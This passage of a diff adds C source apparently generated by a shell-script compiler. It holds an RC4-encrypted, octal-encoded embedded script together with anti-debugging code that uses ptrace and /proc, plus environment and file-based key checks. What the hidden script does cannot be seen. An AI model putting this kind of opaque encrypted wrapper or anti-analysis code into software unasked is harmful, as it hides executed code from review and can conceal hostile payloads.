+	"\063\261\244\103\214\026\171\344\263\153\201\353\103\115\335\170"
+	"\142\313\136\007\324\052\312\236\345\025\276\152\077\203\255\164"
+	"\361\344\032\015\255\344\226\273\335\160\010\163\365\175\342\351"
+	"\010\224\326\022\050\256\124\054\126\224\220\135\136\177\032\211"
+	"\056\172\254\141\171\326\217\221\175\050\023\375\246\041\124\250"
+	"\357\133\225\167\373\003\032\215\346\043\310\010\254\110\241\021"
+	"\214\342\000\213\367\072\027\015\046\231\234\204\274\014\322\163"
+	"\221\102\071\230\037\130\071\240\261\332\143\200\030\003\123\266"
+	"\112\141\153\362\231\227\102\166\271\257\130\147\121\157\121\035"
+	"\037\151\037\123\263\253\272\264\306\034\045\061\054\026\024\006"
+	"\072\310\112\201\167\015\225\033\154\162\235\134\051\376\212\352"
+	"\053\336\243\143\342\120\104\370\163\276\135\025\072\252\230\260"
+	"\276\346\335\317\057\373\221\174\206\055\175\312\140\142\021\271"
+	"\200\035\066\174\257\153\170\136\145\342\015\271\272\356\236\132"
+	"\112\000\160\251\054\346\111\055\273\055\370\255\164\161\302\231"
+	"\067\316\012\047\220\052\022\047\226\300\051\047\203\027\135\055"
+	"\225\377\216\272\364\042\151\133\346\373\347\052\072\147\306\003"
+	"\212\272\251\207\205\237\263\325\071\273\315\233\360\323\222\040"
+	"\234\107\262\312\121\042\110\324\256\167\157\002\150\047\232\140"
+	"\032\374\130\177\260\143\135\347\130\200\317\322\337\335\000\146"
+	"\113\026\153\265\221\203\234\272\106\154\247\002\213\366\307\326"
+	"\102\065\310\027\064\352\257\313\065\304\110\101\013\267\042\244"
+	"\001\273\337\320\226\177\213\124\161\257\023\011\043\110\236\312"
+	"\305\015\073\043\354\367\310\156\021\301\376\261\103\225\013\066"
+	"\334\132\241\073\001\050\013\363\036\102\162\100\021\306\037\134"
+	"\207\307\231\213\157\007\012\242\007\155\200\053\352\370\246\353"
+	"\006\231\332\242\055\230\146\377\142\033\213\231\211\110\131\075"
+	"\035\232\366\311\047\042\200\051\200\327\352\115\366\252\113\307"
+	"\305\105\130\257\117\367\124\334\045\232\227\223\015\356\253\115"
+	"\173\155\063\224\210\013\346\247\107\241\376\141\313\056\024\031"
+	"\304\123\067\025\353\156\374\227\314\174\275\255\252\132\312\242"
+	"\305\317\203\146\012\257\342\261\250\226\306\265\034\353\167\275"
+	"\372\360\266\207\344\372\262\023\124\244\001\275\034\335\225\206"
+	"\127\240\077\247\040\235\153\264\164\373\102\021\202\212\243\302"
+	"\266\032\344\362\316\355\141\202\207\313\334\250\140\114\233\123"
+	"\257\267\211\302\067\141\330\140\177\257\316\211\153\357\041\173"
+	"\154\044\355\261\233\354\056\333\161\345\002\200\165\016\140\351"
+	"\025\127\317\142\242\267\064\154\121\276\266\153\223\006\030\352"
+	"\055\252\171\165\070\146\165\363\174\160\117\200\305\207\345\312"
+	"\253\234\371\062\017\101\255\145\144\173\305\114\262\134\116\167"
+	"\167\230\126\117\130\235\100\164\061\312\052\372\203\371\265\350"
+	"\161\252\031\172\067\237\115\213\040\201\337\163\236\247\371\077"
+	"\220\044\364\264\324\230\042\151\147\307\164\117\052\124\141\144"
+	"\346\014\004\167\006\327\046\335\115\345\166\351\270\305\176\375"
+	"\011\062\051\263\121\114\107\075\104\267\176\350\035\327\061\324"
+	"\160\235\344\215\343\073\374\172\042\301\060\137\365\061\364\012"
+	"\147\232\232\142\052\237\314\121\022\165\064\052\231\014\231\212"
+	"\242\143\030\306\072\363\224\171\174\027\332\257\337\074\072\035"
+	"\262\310\307\027\265\301\306\304\114\274\043\330\051\255\266\343"
+	"\311\077\134\172\163\047\330\234\225\050\040\321\052\210\123\154"
+	"\012\230\036\142\046\151\215\122\263\353\005\054\163\255\207\251"
+	"\203\003\174\064\132\160\311\062\266\357\370\132\304\162\102\226"
+	"\102\246\035\216\372\072\206\117\326\025\376\002\222\074\104\010"
+	"\123\112\011\130\352\250\332\176\015\154\224\223\264\143\063\054"
+	"\070\263\217\130\020\373\231\332\265\125\247\147\211\001\325\271"
+	"\001\203\153\041\253\063\270\117\132\251\347\311\211\051\143\077"
+	"\226\031\044\363\057\100\130\363\216\306\064\234\260\226\206\050"
+	"\040\345\044\330\341\244\372\377\246\251\223\013\125\272\216\375"
+	"\076\142\104\237\070\123\205\176\323\017\045\105\250\145\272\230"
+	"\174\147\233\310\314\125\043\005\166\067\114\231\117\113\136\267"
+	"\050\044\163\377\111\242\020\142\301\025\345\240\277\343\221\015"
+	"\371\060\105\175\355\330\050\051\303\266\330\047\253\007\234\242"
+	"\171\342\146\227\330\336\256\152\332\242\331\374\253\272\021\140"
+	"\060\016\254\353\056\060\326\125\374\372\101\354\033\063\332\205"
+	"\120\064\276\220\220\005\007\224\312\115\107\145\361\134\363\350"
+	"\335\353\171\367\247\067\243\331\361\137\043\272\063\170\243\256"
+	"\070\015\110\370\104\336\324\165\067\335\000\350\243\123\025\120"
+	"\150\111\103\273\114\212\122\035\066\025\341\221\104\210\221\104"
+	"\154\316\161\025\034\303\052\153\142\062\301\177\356\052\060\160"
+	"\133\047\041\073\171\025\075\347\312\147\074\251\052\216\124\230"
+	"\177\102\271\271\130\170\261\335\147\026\374\335\306\123\055\213"
+	"\224\023\170\004\053\245\123\163\221\350\132\311\163\224\125\027"
+	"\146\254\211\107\314\173\061\012\337\131\024\013\030\277\276\203"
+	"\105\142\013\300\015\240\312\271\341\106\140\142\157\246\351\057"
+	"\042\055\172\134\140\250\106\055\162\151\376\265\330\235\055\315"
+	"\030\323\350\015\303\321\113\357\227\006\313\242\310\250\272\013"
+	"\067\210\044\076\356\232\260\200\170\024\324\030\020\061\165\335"
+	"\013\173\073\070\064\050\175\376\325\161\120\271\346\031\116\160"
+	"\064\146\252\246\217\071\312\174\127\152\126\171\231\371\267\117"
+	"\324\233\257\212\275\327\256\222\111\042\105\164\272\124\302\363"
+	"\041\376\212\040\160\173\140\252\235\354\153\313\013\321\207\314"
+	"\210\375\117\134\276\025\006\113\107\157\240\211\312\306\262\057"
+	"\105\335\011\364\222\370\046\267\230\121\030\073\206\150\020\245"
+	"\201\027\277\162\220\141\213\244\254\335\025\003\325\307\323\106"
+	"\016\313\356\064\201\274\202\261\120\252\116\245\014\330\171\056"
+	"\041\327\066\372\221\156\016\137\257\137\017\276\133\045\266\260"
+	"\164\175\007\325\030\067\244\031\046\356\257\002\330\031\003\137"
+	"\143\340\117\337\177\023\066\375\072\117\221\307\234\073\347\214"
+	"\024\345\236\354\267\333\117\053\151\221\071\327\150\232\374\116"
+	"\135\060\046\024\202\002\357\311\253\266\024\156\361\076\320\354"
+	"\325\354\317\247\156\153\300\161\340\110\314\363\212\313\220\222"
+	"\351\061\227\005\250\260\010\262\104\122\003\015\307\016\160\221"
+	"\110\005\015\126\317\060\333\057\025\204\146\213\351\363\117\240"
+	"\326\212\202\341\304\114\331\361\253\065\171\334\042\022\245\113"
+	"\374\017\210\360\017\365\041\033\225\013\070\237\262\320\347\127"
+	"\312\346\125\005\002\212\253\264\014\136\302\327\374\272\177\155"
+	"\241\210\316\330\334\173\012\353\353\172\233\334\352\062\107\030"
+	"\043\071\243\161\065\332\001\262\070\310\355\321\152\041\125\222"
+	"\120\353\262\072\110\145\102\300\174\036\322\040\007\356\103\005"
+	"\367\063\040\017\373\307\016\037\100\134\303\065\134\200\074\201"
+	"\251\125\314\270\113\027\301\152\307\146\343\277\065\310\070\246"
+	"\310\263\245\053\042\215\065\173\321\375\351\124\134\057\366\152"
+	"\303\140\021\357\143\214\067\331\346\124\123\222\271\332\051\347"
+	"\224\173\323\134\252\133\126\102\061\167\323\006\003\370\227\124"
+	"\367\266\362\023\123\060\041\311\335\361\131\257\351\266\022\233"
+	"\321\046\043\226\001\336\366\014\230\277\071\065\310\070\270\002"
+	"\041\203\057\345\156\003\104\374\360\342\202\020\373\142\175\012"
+	"\022\141\054\163\052\143\351\023\241\370\342\067\362\255\224\334"
+	"\150\123\167\377\160\376\027\143\075\126\350\134\221\216\162\220"
+	"\127\351\022\113\305\173\156\264\037\320\151\024\074\273\143\100"
+	"\041\010\303\322\017\141\306\302\370\143\175\372\163\066\125\253"
+	"\005\030\040\204\153\026\014\242\076\300\145\107\116\225\131\040"
+	"\122\340\143\136\033\003\037\250\377\163\046\320\075\352\255\273"
+	"\065\374\273\177\304\351\250\034\322\154\130\021\242\072\021\365"
+	"\345\270\232\055\131\165\357\230\261\037\245\014\305\106\034\351"
+	"\154\006\327\165\151\102\251\164\042\237\005\146\006\031\346\100"
+	"\000\136\074\325\246\317\120\364\234\050\121\375\113\111\137\274"
+	"\047\353\064\201\123\301\161\103\141\204\361\067\153\242\171\205"
+	"\007\054\021\165\133\250\267\105\353\035\312\365\071\232\355\230"
+	"\346\135\170\142\236\173\010\111\215\161\221\313\152\131\001\364"
+	"\126\133\054\312\152\015\315\264\034\231\307\267\356\345\334\036"
+	"\267\357\304\247\261\077\223\341\363\216\032\024\002\041\222\075"
+	"\106\206\372\322\256\360\122\243\104\033\014\177\346\345\107\175"
+	"\144\341\001\166\211\171\375\343\271\064\026\110\364\205\303\153"
+	"\154\262\236\041\315\265\077\027\344\116\134\215\253\077\044\170"
+	"\063\123\236\111\057\126\207\122\372\104\175\245\374\222\274\041"
+	"\011\060\266\341\016\356\164\226\213\216\320\073\376\064\053\223"
+	"\234\017\330\234\077\236\254\035\167\110\050\021\047\070\251\056"
+	"\045\174\003\011\274\201\057\323\230\007\267\116\067\232\307\227"
+	"\234\006\273\103\053\260\060\213\237\361\310\305\303\072\076\107"
+	"\142\242\046\346\061\110\332\067\040\161\116\151\223\147\246\323"
+	"\336\172\245\362\134\352\304\105\377\233\253\174\000\142\346\376"
+	"\350\155\367\007\311\327\222\345\006\345\002\143\045\224\255\362"
+	"\061\070\110\012\337\310\250\232\233\364\260\236\343\342\050\330"
+	"\307\037\350\257\141\013\022\300\302\077\053\045\212\314\213\244"
+	"\052\114\004\214\146\265\256\206\144\360\172\223\103\234\230\377"
+	"\163\146\176\335\226\272\351\210\144\224\016\213\274\027\077\252"
+	"\257\270\235\254\246\166\122\111\121\272\337\347\337\242\347\062"
+	"\052\132\207\142\273\070\314\133\224\113\065\051\157\041\327\263"
+	"\136\202\175\077\125\253\267\033\303\177\213\363\233\074\170\024"
+	"\112\337\202\371\211\123\051\074\157\370\324\244\115\104\367\150"
+	"\304\165\366\010\246\011\057\056\303\336\062\261\163\043\136\141"
+	"\310\117\217\175\370\354\053\376\207\040\110\133\024\061\061\145"
+	"\334\010\312\236\121\306\153\201\125\275\341\132\160\367\203\056"
+	"\140\373\204\302\365\213\340\241\031\027\342\142\250\224\343\264"
+	"\352\344\176\360\105\047\110\142\114\154\374\032\023\260\232\161"
+	"\351\234\143\207\372\073\352\003\345\301\145\360\307\356\110\154"
+	"\352\253\252\261\047\024\075\240\052\112\143\314\276\240\326\350"
+	"\054\023\361\223\022\305\243\002\054\355\152\375\023\316\177\325"
+	"\333\010\261\204\031\163\106\060\152\337\132\141\254\101\052\263"
+	"\232\164\343\246\033\264\073\203\347\316\272\013\043\041\357\222"
+	"\003\015\017\014\030\272\117\047\347\353\230\211\027\003\227\041"
+	"\374\376\226\130\101\220\222\253\234\364\132\177\140\166\240\277"
+	"\170\367\374\303\134\152\325\105\177\255\043\166\267\045\306\033"
+	"\251\254\232\124\236\223\151\163\000\317\146\162\107\017\167\235"
+	"\367\054\032\274\102\254\305\201\052\316\221\052\327\216\341\132"
+	"\256\250\322\300\251\236\216\204\052\234\312\210\370\135\232\146"
+	"\221\330\031\034\357\054\133\137\200\240\110\034\165\056\142\046"
+	"\232\142\321\255\120\001\262\246\321\007\145\130\253\277\327\375"
+	"\337\222\177\167\211\175\003\033\325\360\204\041\217\157\224\330"
+	"\174\324\044\233\122\212\166\116\252\131\261\270\326\303\003\065"
+	"\145\234\311\152\222\135\074\230\375\023\013\357\360\357\231\252"
+	"\043\321\172\112\233\364\373\116\132\347\002\016\350\363\251\141"
+	"\164\115\314\053\074\377\342\302\035\030\022\110\234\045\024\273"
+	"\210\217\235\347\354\332\244\331\113\304\225\044\224\271\103\126"
+	"\147\033\104\204\322\254\343\156\317\353\327\123\016\150\213\011"
+	"\217\021\335\136\221\072\263\001\351\262\000\355\156\332\166\214"
+	"\343\363\131\323\150\143\036\335\207\163\326\264\326\212\067\157"
+	"\320\203\144\270\374\321\204\271\140\105\366\150\023\327\012\064"
+	"\134\030\044\131\376\053\112\125\211\111\346\012\027\370\005\120"
+	"\331\040\252\345\006\007\201\163\010\256\226\324\354\025\065\045"
+	"\304\345\160\132\355\035\265\142\145\030\161\216\374\007\003\172"
+	"\054\110\071\321\377\312\057\346\077\110\211\234\123\042\110\303"
+	"\122\156\245\317\264\114\150\025\272\304\226\156\306\264\331\176"
+	"\004\251\070\265\110\315\337\202\026\166\116\227\250\235\354\161"
+	"\070\275\037\103\250\231\326\067\260\124\356\223\310\341\142\322"
+	"\354\047\105\365\135\054\102\005\015\351\376\315\175\233\061\340"
+	"\335\276\270\167\213\077\020\024\101\261\256\075\245\315\244\140"
+	"\253\316\371\135\062\344\322\301\250\143\047\130\051\261\141\313"
+	"\144\064\351\162\303\010\372\017\350\300\007\367\203\117\073\347"
+	"\374\316\241\376\150\244\222\031\067\214\340\002\367\330\056\206"
+	"\110\045\101\101\077\221\124\051\073\066\175\071\360\207\235\166"
+	"\372\203\242\035\204\254\370\262\300\033\362\076\310\230\201\361"
+	"\177\032\054\275\275\052\365\200\306\227\315\041\324\311\315\010"
+	"\206\107\001\134\222\023\164\107\045\373\350\131\314\034\161\165"
+	"\112\334\361\361\162\001\047\236\157\260\146\153\332\021\011\167"
+	"\036\012\370\362\122\022\052\014\255\342\103\307\205\325\213\246"
+	"\363\151\234\372\073\231\013\166\213\221\207\111\141\326\270\116"
+	"\275\141\335\242\055\031\247\244\140\064\120\276\010\303\357\053"
+	"\031\066\120\324\346\154\052\041\101\015\364\161\354\100\363\362"
+	"\171\261\105\115\312\251\315\234\046\311\322\014\271\353\264\146"
+	"\027\015\021\367\163\042\032\224\212\260\125\025\165\116\345\122"
+	"\357\123\313\264\124\077\071\300\317\223\275\334\202\136\174\357"
+	"\304\120\047\167\323\210\215\065\107\336\073\242\314\060\206\276"
+	"\303\014\235\320\127\312\062\001\246\120\353\346\132\317\167\366"
+	"\254\011\102\211\357\165\120\011\344\013\042\071\332\062\117\315"
+	"\307\176\221\001\050\104\102\372\146\255\007\014\234\021\017\040"
+	"\340\374\006\217\117\171\224\335\243\324\302\077\235\077\316\333"
+	"\057\211\106\120\246\042\334\103\110\014\237\227\237\065\376\115"
+	"\105\073\351\024\061\227\254\172\264\151\241\352\035\175\172\200"
+	"\265\347\270\273\114\366\374\335\206\013\220\306\234\327\251\214"
+	"\230\163\271\161\270\356\155\167\274\254\055\052\222\010\175\222"
+	"\111\266\310\001\056\044\054\355\152\004\243\363\200\111\351\126"
+	"\161\274\001\203\371\151\032\007\162\376\260\277\167\170\354\273"
+	"\374\011\167\351\202\005\202\375\162\226\035\236\330\272\161\056"
+	"\325\160\166\054\145\034\300\261\045\365\136\043\243\043\260\164"
+	"\133\350\115\232\032\350\352\113\241\343\372\335\366\102\173\344"
+	"\114\104\350\336\114\370\167\174\051\056\163\255\355\216\335\056"
+	"\163\033\034\273\207\044\254\332\215\345\366\240\332\304\304\051"
+	"\315\373\332\044\147\047\001\264\141\041\120\223\052\141\306\033"
+	"\336\074\233\074\037\167\222\352\227\246\201\027\253\050\356\121"
+	"\143\057\077\264\074\236\242\076\070\351\060\070\006\111\004\065"
+	"\242\217\375\020\313\175\123\236\013\170\044\020\211\013\365\214"
+	"\225\327\003\274\376\167\342\021\303\242\142\000\121\125\273\032"
+	"\356\314\214\144\264\376\064\030\013\105\060\351\044\236\060\164"
+	"\316\306\362\007\344\016\155\260\160\040\355\300\200\254\132\074"
+	"\363\110\223\117\376\221\372\317\330\242\075\157\111\150\252\255"
+	"\355\336\057\344\113\027\173\353\376\165\160\215\023\167\222\202"
+	"\376\036\011\357\031\073\360\015\077\232\240\113\112\377\243\376"
+	"\030\003\056\002\026\013\103\065\077\145\117\145\020\040\242\363"
+	"\315\276\007\144\356\000\235\215\311\005\367\153\320\063\337\363"
+	"\046\340\067\241\044\367\100\322\375\002\132\371\116\344\115\146"
+	"\151\006\345\340\135\127\336\324\107\125\353\060\003\311\011\237"
+	"\270\024\020\100\160\315\310\152\031\206\366\055\266\224\227\351"
+	"\146\346\361\374\214\216\075\217\331\016\161\377\020\254\001\162"
+	"\076\102\302\205\305\264\141\160\306\321\116\353\176\072\312\201"
+	"\310\075\265\174\103\374\271\075\245\044\020\220\346\230\062\271"
+	"\015\273\020\105\242\124\051\325\315\263\356\226\013\152\236\152"
+	"\270\061\303\174\164\353\051\023\303\341\311\242\042\240\232\136"
+	"\303\245\145\122\155\340\240\015\121\331\145\122\003\053\367\126"
+	"\273\110\345\067\304\302\267\227\027\240\105\053\211\231\127\017"
+	"\362\337\065\156\352\157\351\341\177\367\251\137\050\247\107\127"
+	"\021\034\174\140\250\112\213\264\056\231\365\343\005\217\367\175"
+	"\032\021\157\075\021\260\013\270\300\232\155\113\136\015\112\056"
+	"\144\106\200\331\322\323\347\037\153\153\056\141\145\334\307\315"
+	"\300\147\022\313\314\172\372\020\023\043\236\043\274\256\240\364"
+	"\263\227\041\320\304\261\065\160\024\170\202\341\127\072\271\047"
+	"\042\020\112\071\154\120\004\012\374\161\366\032\156\223\210\007"
+	"\251\114\145\356\376\000\162\365\143\230\375\261\011\064\131\343"
+	"\275\334\225\327\333\012\172\372\105\266\366\027\017\076\333\256"
+	"\245\375\160\202\127\227\331\274\011\363\140\134\363\272\016\130"
+	"\212\213\265\351\324\376\045\020\072\330\342\001\167\021\101\247"
+	"\142\110\301\273\071\172\071\373\300\025\245\127\344\104\133\362"
+	"\307\013\375\141\251\045\223\146\255\140\244\060\024\175\105\225"
+	"\304\173\146\324\236\352\065\356\025\261\241\151\370\075\211\207"
+	"\335\054\027\024\131\255\003\136\000\176\201\261\337\261\262\366"
+	"\075\021\277\027\174\234\123\007\247\062\274\353\056\334\235\124"
+	"\117\213\377\051\327\305\263\156\037\337\021\345\264\143\175\054"
+	"\260\067\301\265\234\274\320\260\373\121\241\105\117\215\025\076"
+	"\060\316\125\151\154\220\341\002\336\042\215\021\347\225\162\113"
+	"\250\336\202\057\077\223\272\260\313\061\301\177\053\115\233\136"
+	"\232\044\046\253\366\363\145\156\156\334\323\321\336\303\007\054"
+	"\007\215\322\121\222\074\033\324\004\177\325\362\140\012\340\326"
+	"\357\347\164\336\235\264\207\010\061\120\034\011\306\320\217\342"
+	"\366\036\171\130\234\224\252\014\207\202\316\317\313\211\050\332"
+	"\216\236\157\230\023\352\333\100\320\052\166\320\322\274\271\162"
+	"\177\034\035\312\035\321\076\304\302\273\100\174\241\031\021\131"
+	"\215\260\257\160\214\110\155\051\053\075\021\213\373\304\216\072"
+	"\126\153\043\266\035\155\221\053\101\154\230\153\020\305\367\367"
+	"\327\105\012\013\035\107\357\361\224\347\037\155\112\301\334\372"
+	"\360\363\032\172\117\173\370\355\317\206\301\044\272\303\221\370"
+	"\372\204\263\347\172\341\044\220\241\171\021\107\367\256\056\120"
+	"\203\162\207\136\272\220\007\305\270\156\215\054\337\057\274\037"
+	"\377\050\064\034\170\177\047\114\002\064\360\346\272\161\312\134"
+	"\271\035\343\337\362\005\303\360\030\343\316\361\011\057\201\114"
+	"\107\176\154\173\066\264\262\344\240\144\330\130\247\220\175\106"
+	"\365\250\024\233\137\025\207\173\303\345\155\107\076\154\077\013"
+	"\322\003\007\044\014\244\171\171\235\016\337\324\160\306\164\114"
+	"\371\062\304\201\100\221\340\147\265\075\075\214\277\216\256\013"
+	"\270\031\136\375\130\053\233\241\127\111\054\236\041\026\006\202"
+	"\244\156\273\234\140\103\054\065\236\321\025\257\227\053\176\247"
+	"\106\374\352\354\122\042\144\267\216\267\254\101\055\247\257\345"
+	"\176\066\345\035\332\320\373\343\110\032\254\340\005\145\110\204"
+	"\147\175\321\245\046\130\173\206\047\140\365\160\050\023\242\325"
+	"\301\261\306\067\334\102\053\104\156\046\104\021\241\357\375\064"
+	"\170\306\050\232\072\260\151\225\005\026\323\341\120\227\074\355"
+	"\210\043\271\117\173\220\203\134\153\274\301\352\344\067\156\062"
+	"\074\047\023\135\371\310\153\203\373\173\072\170\327\143\347\125"
+	"\243\032\044\005\176\164\232\223\217\272\316\174\267\324\067\374"
+	"\137\376\170\014\125\037\036\063\135\332\001\047\127\341\264\151"
+	"\116\010\273\315\060\314\043\266\227\154\365\107\353\320\277\031"
+	"\141\271\260\131\023\071\303\035\242\047\220\355\316\321\066\202"
+	"\217\300\077\124\331\223\160\340\163\334\351\152\143\017\275\106"
+	"\224\276\130\236\125\043\244\360\267\034\372\110\100\330\374\060"
+	"\307\211\230\167\330\357\221\001\140\230\327\171\351\135\116\074"
+	"\367\011\152\206\066\164\170\210\010\065\271\363\010\120\015\336"
+	"\241\340\053\306\023\366\052\334\177\224\161\151\362\300\246\351"
+	"\312\021\160\001\205\351\211\215\036\102\200\047\222\215\005\064"
+	"\156\061\372\201\047\045\136\247\272\317\021\254\220\267\226\133"
+	"\310\007\134\116\360\345\333\017\050\134\066\273\351\074\357\127"
+	"\156\352\331\226\020\067\076\312\007\117\167\227\006\015\362\317"
+	"\024\116\035\005\064\371\024\135\125\113\031\076\207\011\226\365"
+	"\364\157\213\004\247\311\316\256\031\105\105\040\123\070\357\147"
+	"\207\014\155\274\006\201\031\133\314\063\232\124\074\060\112\060"
+	"\240\326\065\107\240\003\365\271\111\073\331\234\164\311\004\374"
+	"\326\161\270\334\363\322\067\300\006\321\024\102\002\137\163\243"
+	"\065\250\352\326\254\340\217\366\034\151\222\221\062\226\215\010"
+	"\010\105\344\373\030\034\273\036\355\320\141\360\060\325\223\146"
+	"\176\176\074\052\137\314\041\173\065\263\014\150\112\232\160\123"
+	"\340\125\116\370\161\012\027\137\333\170\120\013\115\343\161\313"
+	"\141\255\366\300\172\027\074\260\313\111\030\026\343\211\151\303"
+	"\337\267\274\121\302\323\260\235\113\000\251\231\344\032\145\106"
+	"\310\134\007\103\164\104\363\100\215\013\126\161\225\277\065\164"
+	"\167\361\305\072\305\166\327\020\167\201\252\134\233\020\242\144"
+	"\155\252\247\341\356\232\041\173\246\170\355\073\067\042\260\257"
+	"\023\165\351\330\354\301\351\143\102\224\277\336\244\142\103\021"
+	"\014\352\363\372\205\025\166\053\215\143\147\305\206\027\165\232"
+	"\215\137\162\172\040\134\335\143\361\235\102\226\377\205\250\014"
+	"\157\233\006\365\261\175\041\077\341\210\005\147\240\172\001\056"
+	"\331\164\250\372\321\206\136\302\043\240\131\043\045\001\057\225"
+	"\235\066\212\116\264\253\216\225\064\223\374\325\015\376\003\347"
+	"\163\253\342\104\062\100\007\125\340\140\171\005\141\251\233\377"
+	"\337\045\116\223\321\334\051\005\157\046\333\175\044\336\145\227"
+	"\212\107\334\274\207\343\022\150\104\213\156\246\064\011\245\024"
+	"\057\363\250\000\320\322\006\077\370\341\275\035\300\042\265\112"
+	"\152\221\006\361\165\031\132\271\245\310\137\331\321\005\356\001"
+	"\370\227\001\311\151\010\010\142\352\306\177\252\350\064\364\122"
+	"\306\373\104\073\025\236\365"
+#define      inlo_z	3
+#define      inlo	((&data[6232]))
+	"\204\105\313"
+#define      chk1_z	22
+#define      chk1	((&data[6236]))
+	"\203\314\326\212\127\042\132\306\331\354\167\312\235\014\241\166"
+	"\200\253\357\367\171\102\112\072\123"
+#define      xecc_z	15
+#define      xecc	((&data[6260]))
+	"\351\132\077\307\167\063\347\336\307\021\374\132\175\360\165"
+#define      tst1_z	22
+#define      tst1	((&data[6276]))
+	"\346\354\060\227\317\375\350\072\312\022\137\064\166\301\150\134"
+	"\155\367\032\135\353\355\206"
+#define      lsto_z	1
+#define      lsto	((&data[6298]))
+	"\337"/* End of data[] */;
+#define      hide_z	4096
+#define DEBUGEXEC	0	/* Define as 1 to debug execvp calls */
+#define TRACEABLE	0	/* Define as 1 to enable ptrace the executable */
+
+/* rtc.c */
+
+#include <sys/stat.h>
+#include <sys/types.h>
+
+#include <errno.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <time.h>
+#include <unistd.h>
+
+/* 'Alleged RC4' */
+
+static unsigned char stte[256], indx, jndx, kndx;
+
+/*
+ * Reset arc4 stte. 
+ */
+void stte_0(void)
+{
+	indx = jndx = kndx = 0;
+	do {
+		stte[indx] = indx;
+	} while (++indx);
+}
+
+/*
+ * Set key. Can be used more than once. 
+ */
+void key(void * str, int len)
+{
+	unsigned char tmp, * ptr = (unsigned char *)str;
+	while (len > 0) {
+		do {
+			tmp = stte[indx];
+			kndx += tmp;
+			kndx += ptr[(int)indx % len];
+			stte[indx] = stte[kndx];
+			stte[kndx] = tmp;
+		} while (++indx);
+		ptr += 256;
+		len -= 256;
+	}
+}
+
+/*
+ * Crypt data. 
+ */
+void arc4(void * str, int len)
+{
+	unsigned char tmp, * ptr = (unsigned char *)str;
+	while (len > 0) {
+		indx++;
+		tmp = stte[indx];
+		jndx += tmp;
+		stte[indx] = stte[jndx];
+		stte[jndx] = tmp;
+		tmp += stte[indx];
+		*ptr ^= stte[tmp];
+		ptr++;
+		len--;
+	}
+}
+
+/* End of ARC4 */
+
+/*
+ * Key with file invariants. 
+ */
+int key_with_file(char * file)
+{
+	struct stat statf[1];
+	struct stat control[1];
+
+	if (stat(file, statf) < 0)
+		return -1;
+
+	/* Turn on stable fields */
+	memset(control, 0, sizeof(control));
+	control->st_ino = statf->st_ino;
+	control->st_dev = statf->st_dev;
+	control->st_rdev = statf->st_rdev;
+	control->st_uid = statf->st_uid;
+	control->st_gid = statf->st_gid;
+	control->st_size = statf->st_size;
+	control->st_mtime = statf->st_mtime;
+	control->st_ctime = statf->st_ctime;
+	key(control, sizeof(control));
+	return 0;
+}
+
+#if DEBUGEXEC
+void debugexec(char * sh11, int argc, char ** argv)
+{
+	int i;
+	fprintf(stderr, "shll=%s\n", sh11 ? sh11 : "<null>");
+	fprintf(stderr, "argc=%d\n", argc);
+	if (!argv) {
+		fprintf(stderr, "argv=<null>\n");
+	} else { 
+		for (i = 0; i <= argc ; i++)
+			fprintf(stderr, "argv[%d]=%.60s\n", i, argv[i] ? argv[i] : "<null>");
+	}
+}
+#endif /* DEBUGEXEC */
+
+void rmarg(char ** argv, char * arg)
+{
+	for (; argv && *argv && *argv != arg; argv++);
+	for (; argv && *argv; argv++)
+		*argv = argv[1];
+}
+
+int chkenv(int argc)
+{
+	char buff[512];
+	unsigned long mask, m;
+	int l, a, c;
+	char * string;
+	extern char ** environ;
+
+	mask  = (unsigned long)&chkenv;
+	mask ^= (unsigned long)getpid() * ~mask;
+	sprintf(buff, "x%lx", mask);
+	string = getenv(buff);
+#if DEBUGEXEC
+	fprintf(stderr, "getenv(%s)=%s\n", buff, string ? string : "<null>");
+#endif
+	l = strlen(buff);
+	if (!string) {
+		/* 1st */
+		sprintf(&buff[l], "=%lu %d", mask, argc);
+		putenv(strdup(buff));
+		return 0;
+	}
+	c = sscanf(string, "%lu %d%c", &m, &a, buff);
+	if (c == 2 && m == mask) {
+		/* 3rd */
+		rmarg(environ, &string[-l - 1]);
+		return 1 + (argc - a);
+	}
+	return -1;
+}
+
+#if !TRACEABLE
+
+#define _LINUX_SOURCE_COMPAT
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <stdio.h>
+#include <unistd.h>
+
+#if !defined(PTRACE_ATTACH) && defined(PT_ATTACH)
+#	define PTRACE_ATTACH	PT_ATTACH
+#endif
+void untraceable(char * argv0)
+{
+	char proc[80];
+	int pid, mine;
+
+	switch(pid = fork()) {
+	case  0:
+		pid = getppid();
+		/* For problematic SunOS ptrace */
+#if defined(__FreeBSD__)
+		sprintf(proc, "/proc/%d/mem", (int)pid);
+#else
+		sprintf(proc, "/proc/%d/as",  (int)pid);
+#endif
+		close(0);
+		mine = !open(proc, O_RDWR|O_EXCL);
+		if (!mine && errno != EBUSY)
+			mine = !ptrace(PTRACE_ATTACH, pid, 0, 0);
+		if (mine) {
+			kill(pid, SIGCONT);
+		} else {
+			perror(argv0);
+			kill(pid, SIGKILL);
+		}
+		_exit(mine);
+	case -1:
+		break;
+	default:
+		if (pid == waitpid(pid, 0, 0))
+			return;
+	}
+	perror(argv0);
+	_exit(1);
+}
+#endif /* !TRACEABLE */
+
+char * xsh(int argc, char ** argv)
+{
+	char * scrpt;
+	int ret, i, j;
+	char ** varg;
+
+	stte_0();
+	 key(pswd, pswd_z);
+	arc4(msg1, msg1_z);
+	arc4(date, date_z);
+	if (date[0] && (atoll(date)<time(NULL)))
+		return msg1;
+	arc4(shll, shll_z);
+	arc4(inlo, inlo_z);
+	arc4(xecc, xecc_z);
+	arc4(lsto, lsto_z);
+	arc4(tst1, tst1_z);
+	 key(tst1, tst1_z);
+	arc4(chk1, chk1_z);
+	if ((chk1_z != tst1_z) || memcmp(tst1, chk1, tst1_z))
+		return tst1;
+	ret = chkenv(argc);
+	arc4(msg2, msg2_z);
+	if (ret < 0)
+		return msg2;
+	varg = (char **)calloc(argc + 10, sizeof(char *));
+	if (!varg)
+		return 0;
+	if (ret) {
+		arc4(rlax, rlax_z);
+		if (!rlax[0] && key_with_file(shll))
+			return shll;
+		arc4(opts, opts_z);
+		arc4(text, text_z);
+		arc4(tst2, tst2_z);
+		 key(tst2, tst2_z);
+		arc4(chk2, chk2_z);
+		if ((chk2_z != tst2_z) || memcmp(tst2, chk2, tst2_z))
+			return tst2;
+		if (text_z < hide_z) {
+			/* Prepend spaces til a hide_z script size. */
